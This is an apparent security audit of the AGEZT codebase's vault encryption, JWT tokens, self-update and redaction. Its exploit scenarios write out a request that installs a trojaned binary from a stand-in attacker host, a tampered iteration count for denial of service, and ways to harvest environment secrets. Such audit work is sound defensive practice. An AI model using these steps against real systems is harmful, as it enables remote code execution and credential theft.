# Secrets / Crypto / JWT review — AGEZT

**Scope:** `kernel/creds/` (vault encryption, keyring, machine binding, AWS chain, sigv4), `kernel/agentgw/` (token secret + JWT), `kernel/chatgptauth/`, `kernel/auth/`, `kernel/redact/`, `kernel/envscrub/`, `kernel/update/` (Ed25519 release verification), plus the call sites that drive them (`cmd/agezt/main.go`, `kernel/controlplane/`, `kernel/restapi/`).

**Commit:** `f815f56e` (main)
**Skills run:** `sc-secrets`, `sc-crypto`, `sc-jwt`
**Method note:** gitleaks v8.30.1 is clean over all 1,657 commits, so committed-secret detection was not repeated. This pass hunted construction flaws: weak KDF/cipher construction, key reuse, nonce reuse, timing-unsafe comparison, insufficient entropy, secrets reaching logs/journal/child environments, and JWT validation gaps.

**Findings:** 1 High, 3 Medium, 7 Low. No Critical.

---

## SEC-CRYPTO-001 — Self-update applies a caller-supplied binary: the trust-anchor policy keys off `cfg.Source`, not the provenance of the `UpdateInfo`

- **Severity:** High
- **Confidence:** 90
- **CWE:** CWE-494 (Download of Code Without Integrity Check), CWE-345 (Insufficient Verification of Data Authenticity)
- **File:**
  - `D:\Codebox\PROJECTS\AGEZT\kernel\restapi\update_handlers.go:100` (args → `UpdateInfo`), `:128` (`Apply`)
  - `D:\Codebox\PROJECTS\AGEZT\kernel\controlplane\update_control.go:145`, `:167`
  - `D:\Codebox\PROJECTS\AGEZT\kernel\update\update.go:252` (call), `:391`–`:406` (policy)

### Description

`update.Service.Apply` decides how much verification to demand from `s.cfg.Source` — the daemon's *configured* update source — and treats `SourceGitHub` as "trust anchor is GitHub Releases' TLS, signature is best-effort":

```go
func (s *Service) verifySignature(info *UpdateInfo, source Source) error {
	pub := resolvePublicKey()
	if pub == nil {
		if source == SourceEndpoint {
			return ErrSignatureKeyNotConfigured
		}
		return nil          // ← SourceGitHub with no key: accept
	}
	...
```

But the `*UpdateInfo` that reaches `Apply` does not have to come from `Check`. Two authenticated surfaces build it entirely from the request body and never populate `Signature`:

```go
// kernel/restapi/update_handlers.go:105
info := &update.UpdateInfo{
	Version: args.Version,
	SHA256:  args.SHA256,
	URL:     args.URL,
	Notes:   args.Notes,
}   // no Signature field set
```

`kernel/controlplane/update_control.go:145` is identical (`version`, `sha256`, `url`, `notes` from `req.Args`).

So with the shipping defaults (`Source == SourceGitHub`, `DefaultPublicKeyHex == ""`), `Apply` performs exactly two checks on a caller-supplied binary: `requireHTTPS(url)` and `validateSHA256(file, args.SHA256)` — and the attacker supplies *both* the URL and the hash. `verifySignature` then returns `nil`. The staged file is renamed over `<baseDir>/bin/agezt[.exe]` and `chmod 0755`'d (`update.go:270`–`:281`).

This is distinct from the accepted "no key configured" state named in the brief. The accepted state was reasoned about as *"GitHub-sourced updates rely on GitHub Releases' own TLS + asset integrity"* — a statement about **provenance**. That premise silently fails here: the provenance is the request body, not `api.github.com`, yet the code still applies the GitHub policy. The bug is that the policy input (`cfg.Source`) and the data being verified (`info`) can be decoupled.

Two aggravating details:

1. The SSRF dialer for the update client is deliberately permissive — `netguard.New(netguard.AllowLoopback(), netguard.AllowPrivate())` (`update.go:147`). The attacker-supplied URL may therefore point at loopback or any RFC1918 host, not just the public internet.
2. Embedding `DefaultPublicKeyHex` at build time does **not** fix this correctly — it converts the hole into a total outage. Neither caller ever sets `Signature`, so with a key present every `Apply` fails `ErrSignatureMissing` (`update.go:407`–`:410`). And `checkGitHub` never populates `SHA256` at all (`update.go:487`–`:494`), so the legitimate `Check → Apply` path already dies at `validateSHA256`'s empty-hash guard (`update.go:638`). **The signed release path is not wired end-to-end.** Treating this as a release-engineering ldflags task alone would be a mistake.

### Exploit scenario

An operator runs the REST API with `AGEZT_REST_ADDR` set. An attacker who holds a REST bearer token — a leaked `rest.token` file, a compromised SDK client, an over-scoped integration, or an agent that has learned the token — does:

1. Builds a trojaned `agezt` binary, computes its SHA-256, hosts it at `https://attacker.example/agezt_linux_amd64`.
2. `POST /api/v1/update/apply` with `{"version":"99.0.0","sha256":"<their hash>","url":"https://attacker.example/agezt_linux_amd64"}`.
3. `downloadBinary` fetches it (HTTPS ✓), `validateSHA256` matches (their own hash ✓), `verifySignature` returns `nil` (no key + `SourceGitHub` ✓).
4. The trojan is installed at `<baseDir>/bin/agezt` with the execute bit set. On the next daemon restart or watchdog respawn it runs as the daemon user — with the vault machine key, every provider API key, and the agent fleet.

The result is persistent RCE from an API credential, defeating the entire UPD-001 mitigation.

### Remediation

Do not let the caller supply the artifact descriptor. Either:

- **(preferred)** Have `Apply` accept only an `UpdateInfo` the daemon itself produced from `Check` — cache the last `Check` result server-side and have the API pass an opaque handle (or just `version`) that is matched against it; or
- Make `verifySignature` policy depend on the *provenance* of `info`, not on `cfg.Source`: tag `UpdateInfo` with an unexported `origin` field set only by `checkGitHub`/`checkEndpoint`, and require a valid Ed25519 signature for any `UpdateInfo` that did not originate from a `Check`.

Then finish wiring the signed path: have `checkGitHub` publish `SHA256` and `Signature` (from a release manifest asset), and embed `DefaultPublicKeyHex`. Until the path is complete, consider gating `/api/v1/update/apply` behind an explicit `AGEZT_UPDATE_ALLOW_MANUAL=1` opt-in.

**References:** https://cwe.mitre.org/data/definitions/494.html

---

## SEC-CRYPTO-002 — Vault `kdf_iter` has a floor but no ceiling: a tampered `creds.json` is a CPU-exhaustion DoS

- **Severity:** Medium
- **Confidence:** 85
- **CWE:** CWE-834 (Excessive Iteration), CWE-1284 (Improper Validation of Specified Quantity in Input)
- **File:** `D:\Codebox\PROJECTS\AGEZT\kernel\creds\encrypt.go:213`–`:217`, `:305`–`:321`

### Description

`decryptVault` validates the envelope's stored iteration count in one direction only:

```go
if env.KDFIter < KDFIterMinAccepted {
	return nil, fmt.Errorf("creds: kdf_iter %d implausibly low (min %d)", env.KDFIter, KDFIterMinAccepted)
}
```

The reasoning behind the floor (M172: "an attempt to make a stolen vault cheap to crack") is sound, but the same attacker-controlled field is then fed straight into an unbounded loop:

```go
for i := 1; i < iter; i++ {
	mac.Reset(); mac.Write(u); u = mac.Sum(nil)
	for j := range dk { dk[j] ^= u[j] }
}
```

`KDFIter` is a plain `int` deserialized from JSON. At the documented ~100 ms per 200,000 rounds, `kdf_iter: 2000000000` is roughly 1,000 seconds of single-core work **per derivation**.

The blast radius is larger than a one-time boot stall because the memoization cache only helps *after* a derivation completes. Per `encrypt.go:241`–`:244`, several hot paths (Config Center values, catalog list, keyring ops) construct a fresh `creds.Store` per request and call `Load`. Each such request starts its own full derivation before any of them can populate `kdfCache`, so N concurrent requests burn N cores indefinitely.

### Exploit scenario

An attacker with write access to `~/.agezt/creds.json` — a compromised cloud-synced home directory, a restored backup, a malicious agent skill or tool with file-write capability, or a shared workstation — does not need the passphrase. They edit one JSON field:

```json
{ "schema": "agezt-creds-v2", ..., "kdf_iter": 2000000000, ... }
```

The daemon then hangs on boot with no error, and every Config Center / catalog / keyring request pegs a core. There is no timeout on the derivation and no progress signal, so the failure presents as an unexplained hang rather than a tampered file — the operator is unlikely to suspect the vault.

### Remediation

Add a ceiling next to the floor and reject anything above it:

```go
const KDFIterMaxAccepted = 10 * KDFIterations // 2,000,000
if env.KDFIter > KDFIterMaxAccepted {
	return nil, fmt.Errorf("creds: kdf_iter %d implausibly high (max %d) — vault corrupt or tampered", env.KDFIter, KDFIterMaxAccepted)
}
```

The existing `nonce` length guard at `:232` is precisely this pattern applied to a different field; this is the missing sibling.

**References:** https://cwe.mitre.org/data/definitions/834.html

---

## SEC-SECRET-003 — `credential_process` child inherits the daemon's entire environment, including the vault passphrase and every provider key

- **Severity:** Medium
- **Confidence:** 90
- **CWE:** CWE-214 (Invocation of Process Using Visible Sensitive Information), CWE-200
- **File:** `D:\Codebox\PROJECTS\AGEZT\kernel\creds\aws.go:161`–`:162`

### Description

```go
cmd := osexec.CommandContext(ctx, parts[0], parts[1:]...)
output, err := cmd.Output()
```

`cmd.Env` is never set. Per `os/exec` semantics, a nil `Env` means the child inherits `os.Environ()` — the daemon's *complete* environment. That includes:

- `AGEZT_VAULT_PASSPHRASE` (the master key for the at-rest vault, `creds.go:54`)
- `AGEZT_AGENTGW_TOKEN_SECRET` (the gateway's HMAC signing key, `agentgw/secret.go:18`)
- Every provider API key exported into the daemon's environment
- `AGEZT_REDACT_EXTRA` and any other operator-supplied secrets

The repo already owns the correct primitive for this: `kernel/envscrub.Scrubbed()` builds a strict allowlist environment and drops anything matching `KEY|TOKEN|SECRET|PASSWORD|PASSWD|CRED|AWS_|AGEZT_`. It is correctly used by `plugins/tools/browser/action.go:843`, `plugins/tools/coding/coding.go:145`, and `plugins/tools/acpagent/acpagent.go:247`. The AWS credential-process path — arguably the highest-value exec target in the tree, since it runs an arbitrary operator-configured binary — was missed.

Note this is a *pure inheritance* leak: the executed program is generally a legitimate helper (`aws-vault`, a 1Password wrapper). The exposure is that a secret with no business reaching that helper is handed to it anyway, where it can land in the helper's own logs, crash dumps, telemetry, or `/proc/<pid>/environ`.

### Exploit scenario

An operator sets `AGEZT_AWS_CREDENTIAL_PROCESS_ALLOWED=1` and has `credential_process = /usr/local/bin/aws-vault exec prod --json` in `~/.aws/config`. That helper is later updated through a compromised package feed, or is simply a wrapper script that runs `set -x` / `env > /tmp/debug.log` for troubleshooting. The daemon's vault passphrase and gateway HMAC secret are now in that log — from which the attacker can decrypt `creds.json` wholesale and mint arbitrary-capability agent-gateway tokens.

A lower-privilege variant needs no helper compromise at all: any local process able to read `/proc/<pid>/environ` for the short-lived child (same UID) captures the same values.

### Remediation

```go
cmd := osexec.CommandContext(ctx, parts[0], parts[1:]...)
cmd.Env = envscrub.Scrubbed()
```

If a specific passthrough is needed (e.g. `AWS_PROFILE`, `AWS_CONFIG_FILE`), add it explicitly via `envscrub.With(envscrub.Scrubbed(), "AWS_PROFILE="+profile)` rather than reverting to full inheritance. Note `envscrub.Scrubbed()`'s allowlist already keeps `HOME`/`USERPROFILE`/`PATH`, which is what helpers like `aws-vault` actually need.

**References:** https://cwe.mitre.org/data/definitions/214.html

---

## SEC-SECRET-004 — Agent-gateway HMAC secret accepts arbitrary low-entropy values; hashing a short secret normalizes length without adding entropy

- **Severity:** Medium
- **Confidence:** 75
- **CWE:** CWE-521 (Weak Password Requirements), CWE-326 (Inadequate Encryption Strength)
- **File:** `D:\Codebox\PROJECTS\AGEZT\kernel\agentgw\secret.go:41`–`:42`, `:118`–`:127`; `D:\Codebox\PROJECTS\AGEZT\kernel\agentgw\token.go:41`–`:47`

### Description

The hardcoded `"change-me-in-production"` constant is genuinely gone, and the generated path is correct (32 bytes from `crypto/rand`, hex-persisted at 0600 with `O_EXCL`). The two operator-supplied override paths, however, apply no entropy or length floor.

Environment override — any non-blank string is taken verbatim:

```go
if env := strings.TrimSpace(os.Getenv(TokenSecretEnv)); env != "" {
	return []byte(env), nil
}
```

File override — `decodeSecret` falls back to raw bytes for anything that isn't a full-length hex string, explicitly to support "an operator-edited passphrase file":

```go
if raw, err := hex.DecodeString(s); err == nil && len(raw) >= secretBytes {
	return raw, nil
}
return []byte(s)     // any length, any content
```

`NewTokenManager` then papers over the length problem in a way that hides it:

```go
if len(secret) < 32 {
	h := sha256.Sum256(secret)   // 32 bytes out — but still only |secret| bits of entropy
	secret = h[:]
}
```

SHA-256 stretches the *representation* to 32 bytes; it does not stretch the *entropy*. There is no KDF, no salt, and no iteration count — unlike the vault, which correctly runs 200,000 PBKDF2 rounds for exactly this scenario. A dictionary-word secret is recoverable at full hash rate.

### Exploit scenario

The documented use case for `AGEZT_AGENTGW_TOKEN_SECRET` is a split daemon/CLI deployment where "the operator distributes one secret out-of-band" (`secret.go:15`–`:17`). Out-of-band distribution is exactly when a human picks something typeable — `agezt-prod-2026`, or a reused password.

An attacker who observes one agent-gateway token (they are passed to subprocess agent code by design; they appear in subprocess argv/env, tool logs, and crash traces) has a `header.payload.signature` triple. That is an offline oracle: guess a candidate, `sha256` it if under 32 bytes, HMAC the `header.payload`, compare. A GPU rig clears a large wordlist in minutes. With the secret recovered, they mint tokens with any `caps` set they like — `db.write`, `memory.delete`, `config.write` — and the gateway's alg/iss/aud pinning is irrelevant because the tokens are genuinely valid.

### Remediation

Enforce a floor on the override paths and fail loudly rather than silently accepting a weak key:

```go
const minOperatorSecretLen = 32
if env := strings.TrimSpace(os.Getenv(TokenSecretEnv)); env != "" {
	if len(env) < minOperatorSecretLen {
		return nil, fmt.Errorf("agentgw: %s must be at least %d characters (got %d) — generate one with `openssl rand -hex 32`", TokenSecretEnv, minOperatorSecretLen, len(env))
	}
	return []byte(env), nil
}
```

Apply the same floor in `decodeSecret`'s raw-bytes fallback. Optionally, run an operator-supplied secret through the existing `creds.deriveKeyPBKDF2` with a fixed application salt so a weak secret at least costs 200k rounds per guess. Then drop the `len(secret) < 32` hashing branch in `NewTokenManager`, or leave it only as a hard error — right now it makes a weak key look structurally identical to a strong one.

**References:** https://cwe.mitre.org/data/definitions/521.html

---

## SEC-JWT-005 — `ValidateToken` skips the expiry check entirely when `exp` is the zero time

- **Severity:** Low
- **Confidence:** 90
- **CWE:** CWE-613 (Insufficient Session Expiration)
- **File:** `D:\Codebox\PROJECTS\AGEZT\kernel\agentgw\token.go:148`

### Description

```go
if !claims.ExpiresAt.IsZero() && time.Now().After(claims.ExpiresAt) {
	return nil, ErrTokenExpired
}
```

A token whose `exp` claim is absent, `null`, or `"0001-01-01T00:00:00Z"` unmarshals to the zero `time.Time` and short-circuits the guard — it never expires. `CreateToken` does default a zero `ExpiresAt` to `now+1h` (`token.go:57`–`:59`), so no *minted* token hits this, which is why the impact is Low.

The same fail-open shape repeats in `CreateSubprocessToken` (`token.go:176`): the "a subprocess token must never outlive its parent" clamp is guarded by `if !parent.ExpiresAt.IsZero()`, so a parent with no expiry produces an unclamped child.

Everything else in this validator is correct and worth recording as verified: `alg` and `typ` are pinned *before* the signature is trusted (`:113`), closing alg-confusion and `alg:none`; the signature comparison uses `hmac.Equal` (`:124`); `iss`/`aud` are pinned and checked (`:143`).

### Exploit scenario

This requires the signing secret, so it is defense-in-depth rather than a standalone break — but it composes directly with SEC-SECRET-004. An attacker who recovers a weak HMAC secret would normally mint tokens that at least expire; by omitting `exp` from the payload they mint a **permanent** capability token instead. Rotating the gateway secret then becomes the only revocation mechanism, and nothing in the codebase prompts for that.

### Remediation

Fail closed on a missing expiry — a token with no `exp` is malformed, not eternal:

```go
if claims.ExpiresAt.IsZero() {
	return nil, ErrInvalidToken
}
if time.Now().After(claims.ExpiresAt) {
	return nil, ErrTokenExpired
}
```

Apply the same inversion to the parent clamp in `CreateSubprocessToken`.

**References:** https://cwe.mitre.org/data/definitions/613.html

---

## SEC-CRYPTO-006 — Release signature covers an ambiguous concatenation; `version` is never constrained to be newline-free

- **Severity:** Low
- **Confidence:** 60
- **CWE:** CWE-347 (Improper Verification of Cryptographic Signature)
- **File:** `D:\Codebox\PROJECTS\AGEZT\kernel\update\update.go:373`–`:375`, `:524`–`:540`

### Description

```go
func signedMessage(version, sumHex string) []byte {
	return []byte(version + "\n" + sumHex)
}
```

Two variable-length fields are joined by a delimiter that neither field is validated to exclude. `checkEndpoint` accepts `m.Version` from the manifest with only an emptiness check (`:524`) — a version containing `\n` passes straight through.

Under a signature over `V + "\n" + S`, the pairs `("1.0", "aaa…")` and `("1.0\naaa…", "")` produce identical signed bytes. In practice exploitation is blocked downstream: `validateSHA256` rejects an empty hash (`:638`) and requires the value to hex-match the actual file, so the second component cannot be shifted into a usable state. That is why this is Low and not higher — the defense is real but it is *incidental*, sitting in a different function from the signature check, and a future refactor of either side removes it silently.

### Exploit scenario

Requires a legitimately signed release plus a publisher that emits a version string containing a newline — not reachable today. The concern is durability: a canonicalization ambiguity in a code-signing scheme is the kind of latent flaw that becomes live when the signed message is extended (e.g. adding `URL` or a platform field to `signedMessage`), because the delimiter is doing structural work it was never validated to be safe for.

### Remediation

Reject a version containing the delimiter at parse time in `checkEndpoint`, and prefer an unambiguous encoding for the signed message — length-prefix each field, or sign a canonical JSON object, rather than raw concatenation:

```go
if strings.ContainsAny(m.Version, "\n\r") {
	return nil, errors.New("update: manifest version must not contain newlines")
}
```

**References:** https://cwe.mitre.org/data/definitions/347.html

---

## SEC-SECRET-007 — Redaction literal set is per-vault-entry, so secrets nested inside a JSON blob and non-vault daemon tokens are never scrubbed

- **Severity:** Low
- **Confidence:** 70
- **CWE:** CWE-532 (Insertion of Sensitive Information into Log File)
- **File:** `D:\Codebox\PROJECTS\AGEZT\cmd\agezt\main.go:2631`–`:2641` (`credSecrets`), `:646`; `D:\Codebox\PROJECTS\AGEZT\kernel\redact\redact.go:190`–`:212`

### Description

The journal redactor is seeded from whole vault *values*:

```go
for _, n := range names {
	if v := store.Get(n); v != "" {
		vals = append(vals, v)
	}
}
```

Two classes of secret fall outside that set.

**(a) Secrets nested inside a blob.** `kernel/chatgptauth` stores its entire OAuth token set as a single vault entry under `AGEZT_CHATGPT_OAUTH` (`chatgptauth.go:47`–`:48`, `:117`–`:122`) — a marshaled JSON object containing `access_token`, `refresh_token`, and `id_token`. Only the *complete serialized blob* becomes a redaction literal. If any single field appears on its own in an event payload, the literal match fails. Pattern coverage is partial: `access_token` and `id_token` are JWTs and are caught by the `jwt` pattern (`redact.go:93`), but the OpenAI **refresh token** is an opaque string with no `sk-`/`gh`/`xox` prefix and no `eyJ…eyJ…` structure — it matches nothing in `namedPatterns`. It is the longest-lived credential in the set.

**(b) Non-vault daemon secrets.** `credSecrets` reads only the vault. The daemon admin token (`controlplane/server.go:283`), the WebUI SSE token (`webui/webui.go:176`), the REST/OpenAI listen tokens (`httpsurfaces.go:404`, `:464`), and the agent-gateway HMAC secret (`agentgw/secret.go`, stored in `agentgw.secret`, not the vault) are all bare 64-char hex. No built-in pattern matches undelimited hex — deliberately, since that would corrupt hashes and IDs — and none is registered as a literal. `AGEZT_REDACT_EXTRA` exists but is a manual operator step nobody performs for values the daemon generates itself.

The journal is append-only and hash-chained, so anything that lands there is permanent by design (`redact.go:4`–`:9`).

### Exploit scenario

An agent tool errors while handling the OAuth blob, or a diagnostic path serializes a partial token structure, and the refresh token alone reaches an event payload. It is written to the permanent journal in the clear. Anyone with journal read access — a lower-tier operator, a backup, a log-shipping integration, or an agent with `log.read` capability — recovers a credential that mints ChatGPT access tokens indefinitely. The same shape applies to the daemon admin token: it grants full control-plane authority and, once journaled, is not revocable by rotation of anything the operator would think to rotate.

### Remediation

1. Expand the literal set structurally rather than by value. In `credSecrets`, when a vault value parses as JSON, walk it and add each leaf string of `minLiteralLen` or longer as its own literal.
2. Register the daemon-generated tokens with the redactor at mint time — the admin token, the SSE token, the REST/OpenAI listen tokens, and the agent-gateway secret. They are all in hand at `cmd/agezt/main.go` boot.
3. Add a named pattern for `"refresh_token"\s*:\s*"…"` in `templatedPatterns` (the label survives, only the value is masked), matching the existing `aws-secret-access-key` treatment at `redact.go:132`–`:142`.

**References:** https://cwe.mitre.org/data/definitions/532.html

---

## SEC-CRYPTO-008 — Machine-bound vault key carries no secret entropy; the documented disk-image protection does not hold on Linux or Windows

- **Severity:** Low
- **Confidence:** 85
- **CWE:** CWE-522 (Insufficiently Protected Credentials)
- **File:** `D:\Codebox\PROJECTS\AGEZT\kernel\creds\machine.go:19`–`:21` (claim), `:55`–`:72` (derivation); `D:\Codebox\PROJECTS\AGEZT\kernel\creds\machineid_linux.go:17`; `D:\Codebox\PROJECTS\AGEZT\kernel\creds\machineid_windows.go:21`

### Description

The default vault passphrase is a deterministic hash of two non-secret identifiers:

```go
sum := sha256.Sum256([]byte("agezt-vault-machine-v1|" + id + "|" + who))
return "machine-v1:" + hex.EncodeToString(sum[:])
```

The threat model in the header comment is mostly honest and explicitly concedes the local same-user case. One claim overstates:

> "a copy that leaves the machine (cloud-synced home, backup, accidental commit, stolen disk image read on another box) does not decrypt"

That holds for the first three. It does **not** hold for a full disk image on Linux or Windows, because the identity source lives on the same disk as `creds.json`:

- Linux: `/etc/machine-id` or `/var/lib/dbus/machine-id` (`machineid_linux.go:17`) — world-readable, in every image.
- Windows: `HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid` (`machineid_windows.go:21`) — in the `SOFTWARE` registry hive, in every image.
- macOS is the exception: `IOPlatformUUID` comes from hardware via `ioreg` (`machineid_darwin.go:17`) and is genuinely absent from a disk image.

The OS username (`who`) is likewise recoverable from `/etc/passwd` or the profile directory name in the same image.

Separately: the vault's 200,000 PBKDF2 rounds buy nothing on this path. The iteration count raises the cost of *guessing* a passphrase; the machine passphrase is not guessed, it is **computed** from values the attacker already holds. Cost to derive: one SHA-256.

### Exploit scenario

An attacker obtains a laptop disk image, a VM snapshot, or a full filesystem backup of a Linux or Windows host — the canonical "stolen disk image" the comment names. They read `/etc/machine-id` and the username from the same image, recompute `"agezt-vault-machine-v1|" + id + "|" + who`, run one PBKDF2 derivation against the salt stored in the envelope, and decrypt every provider API key and the ChatGPT OAuth blob. Elapsed time: seconds.

The security impact of the *code* is limited — it is documented as a binding mechanism, and encryption-with-a-derivable-key still defeats casual grep and cloud-sync exposure. The risk is that the overstated claim discourages operators from setting `AGEZT_VAULT_PASSPHRASE`, which is the only control that actually addresses this case.

### Remediation

Correct the comment at `machine.go:19`–`:21` to scope the claim accurately — something like *"a copy of the file alone that leaves the machine (cloud-synced home, accidental commit, a backup of `~/.agezt` only) does not decrypt. A FULL disk image of a Linux or Windows host also contains the machine-id source and so does decrypt; set `AGEZT_VAULT_PASSPHRASE` if that is in your threat model. macOS binds to hardware and is not affected."* Surface the same distinction wherever the console reports vault encryption status, so "encrypted ✓" does not read as stronger than it is.

**References:** https://cwe.mitre.org/data/definitions/522.html

---

## SEC-CRYPTO-009 — `kdfCache` grows without bound and retains derived AES keys for superseded vaults

- **Severity:** Low
- **Confidence:** 80
- **CWE:** CWE-401 (Missing Release of Memory), CWE-226 (Sensitive Information in Reusable Resource)
- **File:** `D:\Codebox\PROJECTS\AGEZT\kernel\creds\encrypt.go:283`–`:294`

### Description

```go
var kdfCache sync.Map // string → []byte (the derived key; never mutated)
```

Entries are added and never evicted. The comment argues the map "stays tiny" because "a save replaces the salt" — but that is precisely what makes it grow: `encryptVault` draws a **fresh random salt on every save** (`:156`–`:160`), so every save produces a new cache key on the next load, while the previous entry remains forever.

Two consequences:

1. Unbounded growth proportional to save count over the daemon's lifetime. Each entry is roughly 150 bytes (the `kdf|iter|hex-salt|hex-digest` key plus a 32-byte value), so this is slow — hundreds of KB after thousands of saves — but it is monotonic with no ceiling, on a long-lived daemon that saves on every Config Center write and keyring operation.
2. Every AES-256 key the vault has ever used stays resident in process memory for the daemon's lifetime, including keys for envelopes long since replaced. That widens what a memory dump or core file yields beyond the currently-active key.

The cache-key construction itself is correct and worth noting as verified: it uses `sha256.Sum256(passphrase)` rather than the passphrase itself (`:286`), so the passphrase does not sit in a map key.

### Exploit scenario

Not directly exploitable. It degrades the blast radius of an adjacent compromise: an attacker who obtains a core dump or attaches a debugger to the daemon recovers not just the live vault key but the key for every historical envelope — which matters if older `creds.json` copies survive in backups or snapshots that would otherwise have required separate derivations.

### Remediation

Bound the cache. The simplest correct fix is to keep only the most recent entry per `(kdf, iter, passphrase-digest)` prefix, since a new salt always supersedes the old one for the same vault — replace `sync.Map` with a small mutex-guarded map keyed on that prefix, storing `{salt, key}` and re-deriving on salt mismatch. That preserves the entire performance win (repeated loads of the *current* envelope) while holding exactly one key per vault.

**References:** https://cwe.mitre.org/data/definitions/226.html

---

## SEC-CRYPTO-010 — `NewGateway` converts a CSPRNG failure into a globally-known HMAC key

- **Severity:** Low
- **Confidence:** 85
- **CWE:** CWE-330 (Use of Insufficiently Random Values)
- **File:** `D:\Codebox\PROJECTS\AGEZT\kernel\agentgw\gateway.go:96`–`:99`; `D:\Codebox\PROJECTS\AGEZT\kernel\agentgw\token.go:41`–`:47`

### Description

```go
if len(secret) == 0 {
	// Never sign with an empty/zero key — generate an ephemeral random one.
	secret, _ = randomSecret()
}
```

The error is discarded. `randomSecret` returns `nil` on failure (`secret.go:130`–`:136`), so `secret` stays zero-length and the guard's stated intent is inverted. `NewTokenManager` then takes the short-secret branch:

```go
if len(secret) < 32 {
	h := sha256.Sum256(secret)   // sha256(nil) = e3b0c44298fc1c14…
	secret = h[:]
}
```

`sha256.Sum256(nil)` is the SHA-256 of the empty input — one of the most widely published constants in cryptography. The gateway would sign and validate every capability token under a key any attacker knows by heart.

On Go 1.26.4 (per `go.mod`) this is unreachable: since Go 1.24 `crypto/rand.Read` panics on failure rather than returning an error, so `randomSecret` cannot return `nil, err`. The finding is therefore latent, not live. It is worth fixing because the failure mode is maximally bad (silent total authentication bypass) and because the `len(secret) < 32` hashing branch is exactly what disguises it — an empty key is transformed into something that *looks* like a valid 32-byte key.

### Exploit scenario

Requires a `crypto/rand` failure, which today panics. Were the hashing branch ever reached with an empty secret — a future Go version reverting to error returns, a build for a platform with a different `crypto/rand` implementation, or any other caller passing an empty slice to `NewTokenManager` — an attacker could mint agent-gateway tokens with arbitrary `caps` using a publicly known key, and the alg/iss/aud pinning would validate them as genuine.

### Remediation

Fail closed on both edges. Return an error from `NewGateway` (or panic explicitly) rather than discarding it, and make the empty case in `NewTokenManager` unrepresentable:

```go
func NewTokenManager(secret []byte) (*TokenManager, error) {
	if len(secret) == 0 {
		return nil, errors.New("agentgw: token secret must not be empty")
	}
	...
}
```

This pairs with SEC-SECRET-004 — the same `len(secret) < 32` branch is the mechanism in both.

**References:** https://cwe.mitre.org/data/definitions/330.html

---

## SEC-SECRET-011 — `creds.Save` creates the AGEZT base directory 0755 while sibling credential writers use 0700

- **Severity:** Low
- **Confidence:** 80
- **CWE:** CWE-732 (Incorrect Permission Assignment for Critical Resource)
- **File:** `D:\Codebox\PROJECTS\AGEZT\kernel\creds\creds.go:183`

### Description

```go
if err := os.MkdirAll(filepath.Dir(s.Path), 0755); err != nil {
```

Every other component that writes a credential into the same directory uses owner-only mode:

- `agentgw.ResolveTokenSecret`: `os.MkdirAll(baseDir, 0o700)` (`agentgw/secret.go:50`)
- `auth.WriteTokenFile`: `os.MkdirAll(baseDir, 0o700)` (`auth/tokenfile.go:30`)

`os.MkdirAll` does not chmod a directory that already exists, so the *first* writer to create `~/.agezt` determines its mode permanently. If `creds.Save` gets there first — which it does on any flow that sets a credential before the daemon mints its listen tokens — the directory holding `creds.json`, `agentgw.secret`, `rest.token`, and `openai.token` is world-traversable and world-listable for the life of the install. `creds.Rotate` has the same 0755 at `:257`.

The individual files are all written 0600 via `atomicfile.WriteFile`, and that helper is correct — `os.CreateTemp` opens at 0600 and the chmod-before-rename at `atomicfile.go:46` means the target never briefly exists with wrong permissions. So file *contents* are not exposed. The exposure is directory metadata, and the inconsistency itself.

### Exploit scenario

On a shared Linux workstation or a multi-user build host, any local user can `ls ~victim/.agezt` and enumerate which credential files exist — `agentgw.secret` reveals the gateway is enabled, `rest.token`/`openai.token` reveal which network surfaces are listening and therefore worth probing, and `creds.json`'s mtime tracks credential rotation. It is reconnaissance rather than disclosure, but it is free and it is exactly what the 0700 used elsewhere is meant to prevent.

### Remediation

Change both `creds.Save` and `creds.Rotate` to `0o700` to match the rest of the tree. Consider a single `basedir.Ensure(baseDir)` helper called once at boot before any writer, so the mode cannot depend on which component happens to run first.

**References:** https://cwe.mitre.org/data/definitions/732.html

---

## Informational — companion note to SEC-CRYPTO-001

`checkGitHub` builds its `UpdateInfo` with `Version`, `URL`, and `Notes` only — it never sets `SHA256` or `Signature` (`update.go:487`–`:494`). Since `validateSHA256` rejects an empty hash (`update.go:638`), a `Check → Apply` flow against the default GitHub source **can never complete**; it fails with `"update: empty SHA256 in manifest"`.

This fails closed, so it is not a vulnerability on its own. It matters for two reasons:

1. The only `Apply` path that works today is the caller-supplied one described in SEC-CRYPTO-001 — the unverified path is the *only* functioning path.
2. It means the `SourceGitHub` best-effort branch of `verifySignature` is dead code with respect to the built-in check flow, and that embedding `DefaultPublicKeyHex` would not secure the update mechanism so much as disable it. Any remediation of SEC-CRYPTO-001 should include publishing `sha256` + `signature` from the GitHub release path.

---

## Verified clean

Recorded so future passes do not re-litigate these:

**Vault crypto (`kernel/creds/encrypt.go`)** — `deriveKeyPBKDF2` is a correct RFC 8018 PBKDF2-HMAC-SHA256: `dkLen == hLen` gives exactly one block, `U_1 = HMAC(P, salt‖INT32BE(1))`, `U_j = HMAC(P, U_{j-1})`, and the XOR accumulation runs over every round (`:305`–`:321`). The `mac` object is correctly reused across rounds — `Reset()` preserves the key. AES-256-GCM with a fresh 32-byte salt and fresh 12-byte nonce per save (`:156`–`:173`): no nonce reuse, no static IV, no ECB, no unauthenticated mode. The nonce length is validated *before* `gcm.Open` (`:232`), correctly guarding Go's GCM panic on a wrong-size nonce. GCM auth failure maps to a sentinel without leaking which check failed.

**JWT validation (`kernel/agentgw/token.go`)** — `alg` and `typ` are pinned before the signature is trusted (`:113`), closing both `alg:none` and RS256→HS256 confusion. Signature comparison uses `hmac.Equal` (`:124`). `iss`/`aud` are pinned at mint and enforced at validation (`:143`). No `kid` parameter is consulted, so no kid-injection surface. (Expiry gap is SEC-JWT-005.)

**Daemon token comparison (`kernel/auth/token.go`)** — `subtle.ConstantTimeCompare` throughout; blank tokens can never authorize; all configured user tokens are checked even after a match so position is not leaked through early return.

**Token entropy** — every security token is 32 bytes from `crypto/rand`, hex-encoded: control plane (`server.go:283`), WebUI SSE (`webui.go:176`), WebUI sessions (`session.go:64`), REST/OpenAI listen tokens (`httpsurfaces.go:87`, `:404`, `:464`), tenant keys (`tenant.go:79`), agentgw secret (`secret.go:132`). `math/rand` appears only in `kernel/governor` and `plugins/providers/internal/retry` for backoff jitter — non-security use, correct.

